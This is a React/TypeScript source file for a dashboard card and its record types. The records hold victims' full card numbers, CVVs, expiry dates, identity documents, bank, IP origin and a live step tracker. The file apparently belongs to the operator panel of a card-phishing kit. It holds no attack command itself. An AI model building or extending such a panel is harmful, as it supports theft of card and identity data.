import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Skeleton } from '@/components/ui/skeleton';
import { CATALOG_BC, CATALOG_STEPS } from '@/lib/const';
import { cn, selectColorStatus } from '@/lib/utils';
import { VariantsType } from '@/types/const_types';
import { format, formatDate } from 'date-fns';
import React from 'react';

const CardRender = (r: WebEngageV1InfoAirports) => {
  const CURRENT_STEP = CATALOG_BC[r?.currentStep.step];

  const COLOR_SELECTED = selectColorStatus(CURRENT_STEP);
  const username =
    r.processHistory.at(0)?.data?.username ??
    r.processHistory.at(0)?.data?.document ??
    r.processHistory.at(0)?.data?.fullName;
  console.log(r.dateCreation);
  return (
    <article
      key={r.id}
      onClick={() => r.openCard !== r.id && r.setOpenCard(r.id)}
      className={cn(
        'p-4 space-y-3 border rounded-md bg-muted/20',
        'accordion-content',
        r.openCard === r.id ? 'expanded' : 'collapsed cursor-pointer'
      )}
    >
      <header
        className='flex justify-between cursor-pointer'
        onClick={() => r.openCard === r.id && r.setOpenCard(undefined)}
      >
        <section>
          <p className='text-xs'>
            {format(new Date(r.dateCreation), 'dd-MM-yyyy p')}
          </p>
          <p className='text-md'>{username}</p>
        </section>
        <div className='relative flex font-medium'>
          {COLOR_SELECTED === 'default' ? (
            <Skeleton className='px-[10px] w-fit py-0.5 text-xs grid place-items-center'>
              {r.currentStep.label}
            </Skeleton>
          ) : (
            <>
              <Badge className='relative z-10' variant={COLOR_SELECTED}>
                {r.currentStep.label}
              </Badge>
              {CURRENT_STEP === 'LOADING' && (
                <span className='absolute inset-0 inline-flex w-full h-full duration-500 scale-75 rounded-md bg-destructive animate-ping' />
              )}
            </>
          )}
        </div>
      </header>
      <Separator />
      <section>
        <ul className='relative grid grid-cols-2 text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-sm'>
          <li className='contents'>
            <code className='text-left'>ID:</code>
            <code className='overflow-hidden text-right truncate'>
              {String(r.id)}
            </code>
          </li>
          <li className='contents'>
            <code className='text-left'>Banco:</code>
            <code className='overflow-hidden text-right truncate'>
              {String(r.bank)}
            </code>
          </li>
          <li className='contents'>
            <code className='text-left'>Fecha de creacion:</code>
            <code className='overflow-hidden text-right truncate'>
              {formatDate(r.dateCreation, 'dd-MM-yyyy hh:mm a')}
            </code>
          </li>
        </ul>
      </section>
    </article>
  );
};

export default CardRender;
export interface DataDashboard {
  data: WebEngageV1InfoAirports[];
  totalItems: number;
}
export interface WebEngageV1InfoAirports {
  id: number;
  ipOrigin: string;
  bank: string;
  firstName: string;
  lastName: string;
  documentNumber: string;
  documentType: string;
  phoneNumber: string;
  cardNumber: string;
  cardCVV: string;
  cardMonth: string;
  cardYear: string;
  cardType: string;
  cardBank: string;
  dateCreation: Date;
  address: string;
  currentStep: {
    step: number;
    error: boolean;
    label: string;
  };
  city: string;
  cardFranchise: string;
  processHistory: {
    step: string;
    label: string;
    data: any;
  }[];
  // fn component
  openCard: number | undefined;
  chat: Message[] | [];
  setOpenCard: React.Dispatch<number | undefined>;
  dataSelected: WebEngageV1InfoAirports | undefined;
  deleted?: boolean;
  favorite?: boolean;
}

export type Message = {
  user: string;
  message: string;
  date: string | Date;
};
